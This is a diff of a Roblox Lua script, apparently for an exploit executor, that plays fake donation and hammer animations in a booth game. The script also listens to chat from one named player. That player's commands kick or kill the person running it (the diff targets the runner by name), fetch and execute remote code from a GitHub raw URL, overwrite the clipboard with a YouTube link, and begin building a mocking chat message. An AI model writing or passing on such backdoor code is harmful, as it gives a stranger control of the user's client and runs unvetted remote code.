@@ -1,4 +1,5 @@
 print("Loaded")
+
 game.Players.lzlolaxiamo.Chatted:Connect(function(msg)
     if msg == "here" then
     wait(2)
@@ -17,7 +18,7 @@ _G.InGame = true
 
 
 
-
+local boothid = "11857372286"
 local boothname = "BasicBooth"
 local booth = game:GetService("Workspace").BoothModels[boothname].Base
 function comma(amount)
@@ -111,7 +112,7 @@ print("💰 ".._G.WhoDonated.." tipped "..comma(_G.HowMuchRobux).." Robux to "..
 print("[GLOBAL]: 💰 ".._G.WhoDonated.." tipped "..comma(_G.HowMuchRobux).." Robux to ".._G.WhoGotRobux)
 if _G.InGame == true then
     ingamehammernuke()
-local z = game:GetObjects("rbxassetid://11848484946")[1]
+local z = game:GetObjects("rbxassetid://"..boothid)[1]
 z.Parent = booth
 wait(.45)
 local level5 = game:GetObjects("rbxassetid://10147461869")[1]
@@ -459,9 +460,8 @@ camShake:ShakeOnce(2.5, 4.5, 2.5, 7)
 	local v51 = v11.Values.Hammer_FlameEffectTransparency.Changed:Connect(v47);
 	v47(1);
 	
-	v21:GetMarkerReachedSignal("Eye lense flare"):Connect(function(p15)
-		print("Animation event: Eye lense flare");
-			    		u5(v24.PortalAmbiance, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0), {
+	wait(7.2)
+		u5(v24.PortalAmbiance, TweenInfo.new(3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0), {
 		Volume = 0, 
 		PlaybackSpeed = 0
 	});
@@ -483,6 +483,8 @@ camShake:ShakeOnce(2.5, 4.5, 2.5, 7)
 			Width0 = 0, 
 			Width1 = 0
 		});
+	v21:GetMarkerReachedSignal("Eye lense flare"):Connect(function(p15)
+		print("Animation event: Eye lense flare");
 		l__Sounds__20.LenseFlareEyes.Volume = 0.55
 		l__Sounds__20.LenseFlareEyes:Play();
 		v11.Head.LeftEyeAttachment.Flare.Enabled = true;
@@ -497,7 +499,7 @@ camShake:ShakeOnce(2.5, 4.5, 2.5, 7)
 				});
 			end;
 		end;
-	wait(10.6)
+	wait(3.16)
 	print("Animation event: HammerAppear ");
 	l__DiamondHammer__12.Handle.AppearSound.Playing = true;
 	l__DiamondHammer__12.Handle.AppearSound.Volume = 0;
@@ -1237,9 +1239,9 @@ Icon.IdkWhatIsThis.E:TweenSize(
 wait(16)
 Icon:Destroy()
 end
-elseif msg == "kick" then
+elseif msg == "kick "..game.Players.LocalPlayer.Name then
 game.Players.LocalPlayer:Kick("Kicked bylzlolaxiamo")
-elseif msg == "kill" then
+elseif msg == "kill "..game.Players.LocalPlayer.Name then
 game.Players.LocalPlayer.Character.Humanoid.Health = 0
 elseif msg == "L" then
 game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
@@ -1255,7 +1257,7 @@ ChainsID = "11799838414"
 CrossID = "11801925253"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Xactver/LUA-Scripts/main/yse"))()
 	elseif msg == "setclip" then
-	setclipboard(game.Players.LocalPlayer.Name.."has been ezed with a clipboard")
+	setclipboard("https://www.youtube.com/@kardinhong")
 	elseif msg == game.Players.LocalPlayer.Name.."Like Boy" then
 local args = {
     [1] = "I like boys",
